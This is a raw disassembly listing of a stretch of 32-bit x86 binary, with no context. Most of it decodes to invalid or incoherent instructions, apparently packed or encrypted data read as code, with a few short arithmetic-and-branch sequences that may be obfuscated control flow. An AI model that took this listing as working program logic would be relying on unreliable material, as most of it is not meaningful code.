  40b9b5:	data16 cmp ah,BYTE PTR [ebp-0x6c3f6ea1]
  40b9bc:	mov    ah,0x3a
  40b9be:	call   0x4331:0x5361c536
  40b9c5:	fsubr  QWORD PTR [esi+0x64]
  40b9c8:	addr16 xchg esi,eax
  40b9ca:	push   ebx
  40b9cb:	add    ebx,DWORD PTR [ecx-0x27]
  40b9ce:	xchg   ebx,eax
  40b9cf:	and    dh,ch
  40b9d1:	jecxz  0x40ba41
  40b9d3:	xchg   ecx,eax
  40b9d4:	inc    ebx
  40b9d5:	jge    0x40ba07
  40b9d7:	fldenv [ecx-0xca41457]
  40b9dd:	fild   DWORD PTR [ebx]
  40b9df:	xor    dh,bh
  40b9e1:	sub    dl,al
  40b9e3:	jp     0x40b97e
  40b9e5:	sbb    eax,0x2fb5b483
  40b9ea:	add    dh,BYTE PTR [edx+0x7c]
  40b9ed:	pop    esi
  40b9ee:	xchg   edx,eax
  40b9ef:	mov    edi,0x999ed925
  40b9f4:	bound  eax,QWORD PTR [ebp-0x3f7dd63]
  40b9fa:	jmp    0x40b9e2
  40b9fc:	sbb    ebp,DWORD PTR [edi+0x2b]
  40b9ff:	dec    ebp
  40ba00:	sbb    esi,edx
  40ba02:	sbb    DWORD PTR [ecx-0x71],ebx
  40ba05:	sbb    bl,cl
  40ba07:	cmp    edx,DWORD PTR [edi-0x175df320]
  40ba0d:	push   0x68e0a819
  40ba12:	in     al,dx
  40ba13:	jp     0x40b9d4
  40ba15:	mov    DWORD PTR [edx+ebx*1],esi
  40ba18:	or     eax,0xe75d91df
  40ba1d:	lahf   
  40ba1e:	out    dx,al
  40ba1f:	cmp    eax,0x81d29ed
  40ba24:	inc    edi
  40ba25:	or     ecx,DWORD PTR [ebx+0x4b34932c]
  40ba2b:	dec    eax
  40ba2c:	mov    al,ah
  40ba2e:	loop   0x40ba2a
  40ba30:	jge    0x40b9f3
  40ba32:	xchg   esi,eax
  40ba33:	mov    ebp,0xc4b4e758
  40ba38:	ret    
  40ba39:	or     BYTE PTR [ebx-0x3c],bh
  40ba3c:	test   eax,0x8aac369a
  40ba41:	es pop eax
  40ba43:	es pushf 
  40ba45:	push   esi
  40ba46:	pop    edi
  40ba47:	add    al,BYTE PTR [ebx+0xd4dbcaa]
  40ba4d:	sub    bl,cl
  40ba4f:	popw   ds
  40ba51:	xor    al,0xa
  40ba53:	mov    ah,0x82
  40ba55:	popf   
  40ba56:	cmp    eax,0xc83567ee
  40ba5b:	lods   al,BYTE PTR es:[esi]
  40ba5d:	iret   
  40ba5e:	aad    0xe3
  40ba60:	ja     0x40ba1b
  40ba62:	jg     0x40ba75
  40ba64:	inc    esi
  40ba65:	(bad)  
  40ba66:	jbe    0x40ba5d
  40ba68:	mov    cs,WORD PTR [esp+edi*1-0x27]
  40ba6c:	iret   
  40ba6d:	add    eax,DWORD PTR [eax+ecx*8+0x7b4cd8f5]
  40ba74:	outs   dx,BYTE PTR ds:[esi]
  40ba75:	ficomp DWORD PTR [ecx+0x69e83905]
  40ba7b:	adc    ebp,edi
  40ba7d:	test   eax,0x47b3dc36
  40ba82:	add    BYTE PTR [ebx-0x44],bl
  40ba85:	ins    BYTE PTR es:[edi],dx
  40ba86:	dec    ebx
  40ba87:	mov    bh,0x7e
  40ba89:	mov    cl,0xa3
  40ba8b:	cmc    
  40ba8c:	or     esi,DWORD PTR [edi+eiz*4-0x213e4d75]
  40ba93:	repnz push esp
  40ba95:	ins    BYTE PTR es:[edi],dx
  40ba96:	inc    esp
  40ba97:	icebp  
  40ba98:	sahf   
  40ba99:	call   0x28b8bfc3
  40ba9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba9f:	jecxz  0x40bad6
  40baa1:	arpl   bp,di
  40baa3:	lods   eax,DWORD PTR ds:[esi]
  40baa4:	ret    
  40baa5:	aas    
  40baa6:	jecxz  0x40baf2
  40baa8:	jnp    0x40ba58
  40baaa:	clc    
  40baab:	std    
  40baac:	mov    ah,0x21
  40baae:	lods   eax,DWORD PTR ds:[esi]
  40baaf:	lock retf 0x81c6
  40bab3:	pop    ebx
  40bab4:	ja     0x40baaa
  40bab6:	retf   0x8e7a
  40bab9:	inc    ebp
  40baba:	mov    ebx,0x30744531
  40babf:	jo     0x40bb06
  40bac1:	outs   dx,DWORD PTR ds:[esi]
  40bac2:	cmp    ecx,DWORD PTR [edx]
  40bac4:	inc    esp
  40bac5:	mov    bl,0xdd
  40bac7:	enter  0x87ec,0x8a
  40bacb:	leave  
  40bacc:	mov    eax,0x49a8709
  40bad1:	sub    al,0xd0
  40bad3:	and    DWORD PTR [ecx+0x7e7ee99a],ecx
  40bad9:	push   esi
  40bada:	or     cl,BYTE PTR fs:[edi]
  40badd:	push   cs
  40bade:	cld    
  40badf:	call   0x8409:0x6802b447
  40bae6:	ss pop ds
  40bae8:	cdq    
  40bae9:	retw   0x38cc
  40baed:	sahf   
  40baee:	cwde   
  40baef:	stos   BYTE PTR es:[edi],al
  40baf0:	push   eax
  40baf1:	ficom  WORD PTR [ebp-0x71454f80]
  40baf7:	retf   0x90a5
  40bafa:	pop    fs
  40bafc:	(bad)  
  40bafd:	jg     0x40bae5
  40baff:	sbb    al,0xab
  40bb01:	jb     0x40baeb
  40bb03:	mov    ds:0x5b051bbc,al
  40bb08:	sub    DWORD PTR [ebx],edi
  40bb0a:	bound  ecx,QWORD PTR [ebx-0x3eaa2f78]
  40bb10:	mov    dl,0x2
  40bb12:	clc    
  40bb13:	repz fisttp QWORD PTR [ebp+ecx*4-0x75]
  40bb18:	(bad)  
  40bb19:	in     al,dx
  40bb1a:	jecxz  0x40bab5
  40bb1c:	adc    dl,BYTE PTR [ebx+edi*1]
  40bb1f:	sub    DWORD PTR [edi+edx*4-0x1f],ecx
  40bb23:	add    al,0x52
  40bb25:	xchg   ebp,eax
  40bb26:	cs xchg esi,eax
  40bb28:	je     0x40baad
  40bb2a:	cmc    
  40bb2b:	ret    
  40bb2c:	sub    eax,0x545639c0
  40bb31:	jne    0x40bb87
  40bb33:	inc    ecx
  40bb34:	mov    bh,0xe9
  40bb36:	cmp    eax,0x28bcb092
  40bb3b:	pop    ebp
  40bb3c:	sub    dl,dl
  40bb3e:	adc    eax,0x38816bcd
  40bb43:	popa   
  40bb44:	mov    dl,ah
  40bb46:	jl     0x40bb5f
  40bb48:	mov    ebp,0x977ae42c
  40bb4d:	jbe    0x40bb2a
  40bb4f:	repz imul edi,ebp,0x12bbe1a3
  40bb56:	jle    0x40bb0f
  40bb58:	mov    al,ds:0x7369b90c
  40bb5d:	jo     0x40bb12
  40bb5f:	push   eax
  40bb60:	out    0x77,al
  40bb62:	inc    eax
  40bb63:	stc    
  40bb64:	clc    
  40bb65:	sti    
  40bb66:	aaa    
  40bb67:	out    0x97,eax
  40bb69:	sti    
  40bb6a:	pusha  
  40bb6b:	stc    
  40bb6c:	sbb    al,ch
  40bb6e:	adc    cl,bl
  40bb70:	iret   
  40bb71:	mov    al,gs:0x51c689d0
  40bb77:	mov    eax,0xd254cfde
  40bb7c:	mov    DWORD PTR [edx-0x21350a22],0x6bef53aa
  40bb86:	loopne 0x40bb39
  40bb88:	popa   
  40bb89:	cli    
  40bb8a:	xor    eax,esp
  40bb8c:	inc    eax
  40bb8d:	sub    ebx,ecx
  40bb8f:	mov    cl,0xbb
  40bb91:	test   al,0xc
  40bb93:	popf   
  40bb94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb95:	mov    ebx,0xb04c37dd
  40bb9a:	push   ds
  40bb9b:	jnp    0x40bb62
  40bb9d:	and    al,0xac
  40bb9f:	xchg   edi,eax
  40bba0:	sti    
  40bba1:	add    eax,0x5a3b0afb
  40bba6:	mov    ah,0xe5
  40bba8:	adc    bh,BYTE PTR [esi-0x1f547acb]
  40bbae:	jno    0x40bbc6
  40bbb0:	sti    
  40bbb1:	repz bound esp,QWORD PTR [esi-0x6f]
  40bbb5:	icebp  
  40bbb6:	dec    edx
  40bbb7:	and    al,0x59
  40bbb9:	(bad)  
  40bbba:	sar    DWORD PTR [ecx-0x345c91],cl
  40bbc0:	xchg   esp,eax
  40bbc1:	dec    ebx
  40bbc2:	rol    BYTE PTR [ebp+eax*1+0x28],cl
  40bbc6:	jbe    0x40bc38
  40bbc8:	sub    DWORD PTR [ebp-0x1d],ebx
  40bbcb:	xchg   edx,eax
  40bbcc:	adc    ecx,DWORD PTR [eax+0x6ece89bd]
  40bbd2:	call   0xa7441a14
  40bbd7:	call   0xefe2:0xc6bd0042
  40bbde:	mov    dl,0x7f
  40bbe0:	jl     0x40bc38
  40bbe2:	pop    ds
  40bbe3:	xor    dh,dl
  40bbe5:	add    ebp,DWORD PTR [ebx+ebp*8-0x80]
  40bbe9:	aad    0x7c
  40bbeb:	test   eax,0x6de4d8ca
  40bbf0:	repz repz xchg esp,eax
  40bbf3:	mov    dl,0x84
  40bbf5:	sbb    esi,ebp
  40bbf7:	xchg   ebp,eax
  40bbf8:	sbb    esi,DWORD PTR [ebx-0x37]
  40bbfb:	push   ecx
  40bbfc:	cli    
  40bbfd:	jl     0x40bbb4
  40bbff:	jecxz  0x40bbf3
  40bc01:	jae    0x40bbce
  40bc03:	pushf  
  40bc04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc05:	pop    ss
  40bc06:	pop    es
  40bc07:	jbe    0x40bc85
  40bc09:	mov    WORD PTR [esi],cs
  40bc0b:	jmp    0x85df:0x7b3efb25
  40bc12:	out    0x8a,eax
  40bc14:	push   ds
  40bc15:	pusha  
  40bc16:	mov    ch,0x39
  40bc18:	mov    cl,0xa6
  40bc1a:	xchg   esi,eax
  40bc1b:	inc    ebp
  40bc1c:	adc    DWORD PTR [edi+0x2d],eax
  40bc1f:	mov    eax,0x7dddabc7
  40bc24:	inc    ecx
  40bc25:	loopne 0x40bbec
  40bc27:	(bad)  
  40bc28:	fcomp  st(1)
  40bc2a:	fcom   DWORD PTR [ebx+0x2a846f24]
  40bc30:	pxor   mm1,mm3
  40bc33:	imul   DWORD PTR [edi+0x13]
  40bc36:	push   ecx
  40bc37:	in     al,dx
  40bc38:	or     BYTE PTR [edi+0x6b],dl
  40bc3b:	mov    cl,0x83
  40bc3d:	mov    ebx,0x2d2caa76
  40bc42:	jle    0x40bc9d
  40bc44:	int    0xd7
  40bc46:	sub    edi,DWORD PTR fs:[edx]
  40bc49:	je     0x40bc76
  40bc4b:	add    edi,ebx
  40bc4d:	leave  
  40bc4e:	jns    0x40bc24
  40bc50:	mov    ds:0x99a65e34,al
  40bc55:	out    0x7a,ax
  40bc58:	int    0xdf
  40bc5a:	(bad)  
  40bc5b:	ins    BYTE PTR es:[edi],dx
  40bc5c:	or     ecx,DWORD PTR gs:[esi]
  40bc5f:	push   esi
  40bc60:	(bad)  
  40bc61:	int    0x78
  40bc63:	sub    al,0xf9
  40bc65:	ret    0xfff1
  40bc68:	ret    
  40bc69:	in     eax,dx
  40bc6a:	mov    ds:0xc1626bd1,eax
  40bc6f:	ret    
  40bc70:	call   0x9a76:0x70d06c6
  40bc77:	or     al,0x95
  40bc79:	gs adc ecx,esp
  40bc7c:	jb     0x40bc4c
  40bc7e:	pushf  
  40bc7f:	nop    DWORD PTR [ebx]
  40bc82:	add    al,0xe2
  40bc84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc85:	sub    al,0x71
  40bc87:	mov    cs,WORD PTR [edx+ecx*1-0xb01456d]
  40bc8e:	jge    0x40bc38
  40bc90:	mov    edi,0xef8d8749
  40bc95:	fisubr WORD PTR [esi-0x567a5f8]
  40bc9b:	jp     0x40bd01
  40bc9d:	inc    eax
  40bc9e:	inc    esp
  40bc9f:	sbb    al,0xb9
  40bca1:	sbb    al,0xb
  40bca3:	push   edx
  40bca4:	jbe    0x40bcb7
  40bca6:	add    dl,BYTE PTR [edx]
  40bca8:	retf   0xb6d8
  40bcab:	pop    edi
  40bcac:	jb     0x40bd21
  40bcae:	inc    DWORD PTR [eax-0x60]
  40bcb1:	neg    DWORD PTR [edi+0x75]
  40bcb4:	inc    ebp
  40bcb5:	dec    edi
  40bcb6:	cld    
  40bcb7:	mov    dh,BYTE PTR [ecx+0x587434ff]
  40bcbd:	adc    BYTE PTR ds:0xf2289ba4,ah
  40bcc3:	test   BYTE PTR [edi+edx*8-0x14],bl
  40bcc7:	popa   
  40bcc8:	cmp    ebp,ebp
  40bcca:	push   cs
  40bccb:	cdq    
  40bccc:	shl    DWORD PTR [ebx-0x3224172],cl
  40bcd2:	repnz mov bh,0xed
  40bcd5:	fld    DWORD PTR [edi]
  40bcd7:	iret   
  40bcd8:	sar    DWORD PTR [esi-0x2c],0x69
  40bcdc:	and    ah,al
  40bcde:	cdq    
  40bcdf:	push   ecx
  40bce0:	lods   eax,DWORD PTR ds:[esi]
  40bce1:	inc    eax
  40bce2:	sbb    BYTE PTR [ebp-0x7a198bb3],ch
  40bce8:	inc    ecx
  40bce9:	fisttp QWORD PTR ds:0x2fe634ca
  40bcef:	call   0xa4401fb2
  40bcf4:	mov    ebx,DWORD PTR [ebp-0x10]
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    al,BYTE PTR ds:0x8fb4b14e
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bce1
  40bd4b:	ja     0x40bd9d
  40bd4d:	add    edi,esi
  40bd4f:	adc    dl,BYTE PTR [eax]
  40bd51:	sbb    al,0xeb
  40bd53:	scas   eax,DWORD PTR es:[edi]
  40bd54:	push   ds
  40bd55:	push   0xffffff83
  40bd57:	mov    ch,0xd9
  40bd59:	adc    esp,DWORD PTR [edx]
  40bd5b:	fdiv   DWORD PTR [ebp+0x292fd2b7]
  40bd61:	pop    ebp
  40bd62:	xchg   ecx,eax
  40bd63:	jo     0x40bdbb
  40bd65:	mov    es,WORD PTR ds:0xefbc92bd
  40bd6b:	fs lock pushf 
  40bd6e:	push   edx
  40bd6f:	stos   DWORD PTR es:[edi],eax
  40bd70:	xor    BYTE PTR [edx-0x5a54417a],bh
  40bd76:	repnz mov ebp,DWORD PTR [esi]
  40bd79:	xor    eax,eax
  40bd7b:	test   eax,0xd25a4923
  40bd80:	dec    esi
  40bd81:	addr16 retf 
  40bd83:	out    dx,al
  40bd84:	xor    ch,bh
  40bd86:	nop
  40bd87:	sub    dh,al
  40bd89:	cs sbb al,0x72
  40bd8c:	push   cs
  40bd8d:	(bad)  
  40bd8f:	xor    al,0xff
  40bd91:	jle    0x40bde1
  40bd93:	fs push es
  40bd95:	xchg   esi,eax
  40bd96:	adc    edx,edi
  40bd98:	dec    esi
  40bd99:	ret    
  40bd9a:	addr16 stc 
  40bd9c:	(bad)  
  40bd9d:	fsub   st,st(2)
  40bd9f:	mov    dl,0xa7
  40bda1:	add    al,0xc0
  40bda3:	jmp    0x40bd99
  40bda5:	inc    eax
  40bda6:	dec    edi
  40bda7:	leave  
  40bda8:	xchg   edx,eax
  40bda9:	jle    0x40bdaa
  40bdab:	jp     0x40be0a
  40bdad:	mov    ah,0x13
  40bdaf:	(bad)  
  40bdb1:	ror    DWORD PTR [esi-0x3b],cl
  40bdb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdb5:	mov    dh,0xcc
  40bdb7:	xchg   ecx,eax
  40bdb8:	dec    eax
  40bdb9:	(bad)  
  40bdba:	mov    ds:0x7b548e05,eax
  40bdbf:	xchg   esp,eax
  40bdc0:	xor    eax,DWORD PTR [ecx+0x72b7a079]
  40bdc6:	sub    dl,ch
  40bdc8:	or     DWORD PTR [ecx+0x28],esi
  40bdcb:	ret    
  40bdcc:	je     0x40bd8a
  40bdce:	dec    ebx
  40bdcf:	mov    WORD PTR [ecx+0x5f],fs
  40bdd2:	test   eax,0x30d12209
  40bdd7:	in     al,0xbc
  40bdd9:	pusha  
  40bdda:	stos   BYTE PTR es:[edi],al
  40bddb:	adc    al,0xff
  40bddd:	xor    bh,ah
  40bddf:	dec    ebx
  40bde0:	add    ebx,DWORD PTR [eax+0x3ae22fc]
  40bde6:	pusha  
  40bde7:	aas    
  40bde8:	(bad)  
  40bde9:	rol    DWORD PTR es:[esi-0x7e11f6c5],1
  40bdf0:	loop   0x40be21
  40bdf2:	(bad)  [ebp*1+0x5c9f01ef]
  40bdf9:	dec    BYTE PTR [edx+0xddc6eb5]
  40bdff:	int3   
  40be00:	stc    
  40be01:	mov    edx,0xb9a3b601
  40be06:	(bad)  
  40be07:	jae    0x40be73
  40be09:	adc    BYTE PTR [eax],bh
  40be0b:	mov    edx,0xc3c8c460
  40be10:	aas    
  40be11:	mov    ds,esi
  40be13:	repnz shl DWORD PTR [ecx],0x4e
  40be17:	ss pop esp
  40be19:	aas    
  40be1a:	jge    0x40be65
  40be1c:	xchg   ecx,eax
  40be1d:	or     al,0x2d
  40be1f:	mov    bh,0x54
  40be21:	int    0xaf
  40be23:	add    eax,0xe3aca75d
  40be28:	test   eax,0xc26cab00
  40be2d:	adc    al,0xeb
  40be30:	xchg   ebx,eax
  40be31:	xchg   DWORD PTR [ebx+0x951d9e6],edi
  40be37:	xor    eax,0x374e2793
  40be3c:	fxch   st(1)
  40be3e:	mov    esi,0x9b6eccd0
  40be43:	pop    esp
  40be44:	dec    edi
  40be45:	out    0x9d,al
  40be47:	loop   0x40be15
  40be49:	sub    dh,BYTE PTR [ecx]
  40be4b:	adc    bl,BYTE PTR [ecx-0x23]
  40be4e:	mov    ebx,0xf11ddd1b
  40be53:	push   eax
  40be54:	add    dl,BYTE PTR [ecx]
  40be56:	jge    0x40be9c
  40be58:	rol    bh,1
  40be5a:	(bad)  
  40be5b:	mov    cl,0xe3
  40be5d:	adc    edi,eax
  40be5f:	inc    ecx
  40be60:	mov    eax,0x22017b1c
  40be65:	xchg   esp,eax
  40be66:	pop    esp
  40be67:	mov    ds:0xc4ddaad,al
  40be6c:	scas   eax,DWORD PTR es:[edi]
  40be6d:	inc    ebp
  40be6e:	out    0x33,eax
  40be70:	das    
  40be71:	add    DWORD PTR gs:[edx+esi*1],esi
  40be75:	aaa    
  40be76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be77:	int3   
  40be78:	mov    esp,0xaafc8c7f
  40be7d:	inc    ebx
  40be7e:	sbb    al,0x4d
  40be80:	call   0xd0d9:0x88da4681
  40be87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be88:	mov    ebp,0x95fafd1c
  40be8d:	dec    ebx
  40be8e:	icebp  
  40be8f:	xchg   edi,eax
  40be90:	icebp  
  40be91:	mov    bl,0xcd
  40be93:	jmp    0xc4b4:0x8258c351
  40be9a:	aaa    
  40be9b:	jnp    0x40beb8
  40be9d:	popw   es
  40be9f:	xor    BYTE PTR [edi+0x5c],0x52
  40bea3:	jmp    0x40beb4
  40bea5:	(bad)  
  40bea6:	out    dx,eax
  40bea7:	out    dx,eax
  40bea8:	mov    ch,0x12
  40beaa:	cmp    dl,BYTE PTR [esp+ecx*4]
  40bead:	sahf   
  40beae:	jg     0x40becb
  40beb0:	dec    esi
  40beb1:	retf   0xc9c8
  40beb4:	adc    dl,bl
  40beb6:	out    dx,al
  40beb7:	ds xchg dx,ax
  40beba:	or     eax,0xe2e79f51
  40bebf:	mov    edx,0x1150c24f
  40bec4:	(bad)  
  40bec5:	loope  0x40bedc
  40bec7:	add    ebx,0x999165a2
  40becd:	push   ecx
  40bece:	ja     0x40bf0f
  40bed0:	push   esp
  40bed1:	sbb    al,0xa4
  40bed3:	mov    ebp,0x48bc3512
  40bed8:	mov    bl,0xe9
  40beda:	test   al,0x5a
  40bedc:	fadd   DWORD PTR [eax-0x7b6b4caf]
  40bee2:	mov    BYTE PTR [edi-0x2],bh
  40bee5:	push   edi
  40bee6:	dec    edi
  40bee7:	xchg   edx,eax
  40bee8:	aaa    
  40bee9:	popf   
  40beea:	cmp    eax,DWORD PTR [edx+0x7d]
  40beed:	scas   eax,DWORD PTR es:[edi]
  40beee:	mov    ecx,0xf73fdc44
  40bef3:	stos   DWORD PTR es:[edi],eax
  40bef4:	cmp    edx,DWORD PTR [ebx+0xc]
  40bef7:	ficom  DWORD PTR [ebp*4-0xac0ce9f]
  40befe:	clc    
  40beff:	dec    ecx
  40bf00:	aaa    
  40bf01:	mov    eax,0xdbc5071d
  40bf06:	lods   eax,DWORD PTR ds:[esi]
  40bf07:	mov    esi,DWORD PTR [esi]
  40bf09:	pop    eax
  40bf0a:	mov    eax,0xf5cae1dc
  40bf0f:	in     eax,0xd7
  40bf11:	mov    esp,0x35430d3c
  40bf16:	adc    al,0x18
  40bf18:	jle    0x40bf41
  40bf1a:	push   0x77
  40bf1c:	pand   mm5,QWORD PTR [ecx+0x7d]
  40bf20:	cmp    al,0x43
  40bf22:	mov    dh,0xac
  40bf24:	adc    DWORD PTR [ebx+0x48],ecx
  40bf27:	jecxz  0x40bf09
  40bf29:	js     0x40bf38
  40bf2b:	mov    es,WORD PTR [edx+0x21]
  40bf2e:	pop    eax
  40bf2f:	sbb    eax,0xeb5d9617
  40bf34:	xchg   ecx,eax
  40bf35:	stc    
  40bf36:	add    DWORD PTR [ebx],esi
  40bf38:	retf   
  40bf39:	int3   
  40bf3a:	sbb    BYTE PTR [ecx],al
  40bf3c:	in     eax,dx
  40bf3d:	jno    0x40bf56
  40bf3f:	gs sbb eax,0x3b3518eb
  40bf45:	adc    DWORD PTR [ecx],0xffffffe6
  40bf48:	xchg   ecx,eax
  40bf49:	int3   
  40bf4a:	pushf  
  40bf4b:	ins    WORD PTR es:[edi],dx
  40bf4d:	dec    edx
  40bf4e:	jmp    0xbfc48734
  40bf53:	mov    cl,0xb9
  40bf55:	mov    esp,0x674a0d36
  40bf5a:	out    dx,al
  40bf5b:	je     0x40bee5
  40bf5d:	dec    esi
  40bf5e:	popf   
  40bf5f:	test   DWORD PTR [esi+0x73],ebx
  40bf62:	jns    0x40bf4d
  40bf64:	addr16 stc 
  40bf66:	push   ebx
  40bf67:	clc    
  40bf68:	add    ah,BYTE PTR [eax]
  40bf6a:	push   edi
  40bf6b:	xchg   DWORD PTR [eax],eax
  40bf6d:	add    ecx,DWORD PTR [edi-0x256a39ca]
  40bf73:	call   0x7ea31451
  40bf78:	jge    0x40bf2c
  40bf7a:	nop
  40bf7b:	push   es
  40bf7c:	dec    eax
  40bf7d:	or     ah,BYTE PTR ds:0xc723aec3
  40bf83:	adc    bl,0x8
  40bf86:	sub    al,0x83
  40bf88:	or     DWORD PTR [edx-0x15887c33],edi
  40bf8e:	scas   eax,DWORD PTR es:[edi]
  40bf8f:	out    dx,al
  40bf90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf91:	inc    ebp
  40bf92:	pop    es
  40bf93:	ret    0x5aa8
  40bf96:	mov    WORD PTR [eax+0x227eb336],gs
  40bf9c:	sub    eax,0x332c0aa0
  40bfa1:	imul   edx,DWORD PTR [esi+0x11],0x2
  40bfa5:	in     eax,dx
  40bfa6:	outs   dx,BYTE PTR ds:[esi]
  40bfa7:	push   edx
  40bfa8:	jecxz  0x40bf6c
  40bfaa:	shl    dl,cl
  40bfac:	stc    
  40bfad:	add    al,ah
  40bfaf:	test   BYTE PTR [eax],ch
  40bfb1:	arpl   cx,si
  40bfb3:	out    0x27,al
  40bfb5:	icebp  
  40bfb6:	mov    esi,0xad2b171
  40bfbb:	popa   
  40bfbc:	in     al,dx
  40bfbd:	jne    0x40bf61
  40bfbf:	mov    ?,WORD PTR [edx-0x48161d41]
  40bfc5:	add    DWORD PTR [ecx],eax
  40bfc7:	sbb    al,0x61
  40bfc9:	cmp    BYTE PTR [edx-0x43],dh
  40bfcc:	(bad)  
  40bfcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfce:	hlt    
  40bfcf:	jge    0x40c02b
  40bfd1:	(bad)  
  40bfd2:	das    
  40bfd3:	pop    esp
  40bfd4:	cli    
  40bfd5:	cli    
  40bfd6:	sub    DWORD PTR [edx+eax*2+0x19fe1840],ebp
  40bfdd:	fistp  WORD PTR [ecx+0x6f]
  40bfe0:	sub    eax,0x2ecb42
  40bfe5:	cmp    DWORD PTR [ebx+0x629dec35],ebp
  40bfeb:	fisubr DWORD PTR [ecx-0x6bbe8fd9]
  40bff1:	bound  edx,QWORD PTR fs:[ecx+0x320c8e19]
  40bff8:	xchg   esi,eax
  40bff9:	nop
  40bffa:	jp     0x40c046
  40bffc:	inc    ebx
  40bffd:	in     eax,0x81
  40bfff:	or     al,0xde
  40c001:	mov    ah,BYTE PTR [eax]
  40c003:	mov    eax,0x6eafbc22
  40c008:	mov    WORD PTR [ebp+0x7205ef68],es
  40c00e:	dec    DWORD PTR [edx]
  40c010:	adc    ch,BYTE PTR [esi]
  40c012:	push   ecx
  40c013:	into   
  40c014:	jbe    0x40bfad
  40c016:	fs adc edx,ebx
  40c019:	pop    eax
  40c01a:	dec    edx
  40c01c:	ds pop edi
  40c01e:	es mov bh,0xfa
  40c021:	lahf   
  40c022:	rcl    BYTE PTR [ebx-0x64183e5b],1
  40c028:	inc    ebp
  40c029:	aad    0x21
  40c02b:	ret    0xce2e
  40c02e:	sbb    ch,BYTE PTR [ecx]
  40c030:	xlat   BYTE PTR ds:[ebx]
  40c031:	jo     0x40c08a
  40c033:	fimul  DWORD PTR [esi+ebx*2-0x51d929fa]
  40c03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c03b:	dec    esi
  40c03c:	stos   BYTE PTR es:[edi],al
  40c03d:	push   ds
  40c03e:	inc    eax
  40c03f:	mov    bl,bh
  40c041:	dec    eax
  40c042:	sub    cl,BYTE PTR [edi]
  40c044:	add    BYTE PTR [ebp-0x173e81af],dl
  40c04a:	clc    
  40c04b:	jne    0x40c037
  40c04d:	mov    dh,0x56
  40c04f:	sbb    DWORD PTR [esi],edi
  40c051:	clc    
  40c052:	and    dh,BYTE PTR [esi+0x17f3a658]
  40c058:	enter  0xbc61,0x57
  40c05c:	arpl   WORD PTR [ebx-0x3441ab82],dx
  40c062:	fidivr DWORD PTR [edx+ebx*2]
  40c065:	fldcw  WORD PTR ds:0xe64ddd54
  40c06b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c06c:	retf   0xe117
  40c06f:	mov    al,0xf4
  40c071:	ins    BYTE PTR es:[edi],dx
  40c072:	push   ebp
  40c073:	cwde   
  40c074:	push   cs
  40c075:	leave  
  40c076:	sbb    al,bh
  40c078:	test   eax,0x9ba9b0e4
  40c07d:	jne    0x40c0a0
  40c07f:	das    
  40c080:	fmulp  st(4),st
  40c082:	or     eax,0x415a79d
  40c087:	or     al,0x84
  40c089:	daa    
  40c08a:	bound  eax,QWORD PTR [ebx]
  40c08c:	into   
  40c08d:	nop
  40c08e:	out    dx,eax
  40c08f:	loope  0x40c03e
  40c091:	cmp    al,0x1d
  40c093:	adc    al,0xa8
  40c095:	in     al,0xbe
  40c097:	(bad)  
  40c099:	lods   eax,DWORD PTR ds:[esi]
  40c09a:	das    
  40c09b:	pop    ebx
  40c09c:	mov    ebx,0xe74bc22e
  40c0a1:	mov    ds:0x768314d7,al
  40c0a6:	or     DWORD PTR [esp+esi*2],ecx
  40c0a9:	popa   
  40c0aa:	cld    
  40c0ab:	jnp    0x40c04c
  40c0ad:	pop    es
  40c0ae:	in     eax,0x91
  40c0b0:	and    BYTE PTR [ebx-0x5c7600a6],bh
  40c0b6:	cs push ds
  40c0b8:	sti    
  40c0b9:	fwait
  40c0ba:	jl     0x40c0e4
  40c0bc:	and    eax,esp
  40c0be:	jmp    0xe76:0x5e5905be
  40c0c5:	es xor eax,0x58fc4007
  40c0cb:	enter  0x9c94,0x8f
  40c0cf:	rdpmc  
  40c0d1:	neg    cl
  40c0d3:	adc    al,0x74
  40c0d5:	pop    esp
  40c0d6:	and    eax,0xfe6ec166
  40c0db:	sub    edi,DWORD PTR [edi+0x2ea120b8]
  40c0e1:	xchg   ebp,eax
  40c0e2:	xchg   ebx,ebp
  40c0e4:	xchg   edi,eax
  40c0e5:	into   
  40c0e6:	fs scas al,BYTE PTR es:[edi]
  40c0e8:	aam    0x3
  40c0ea:	pop    ebp
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
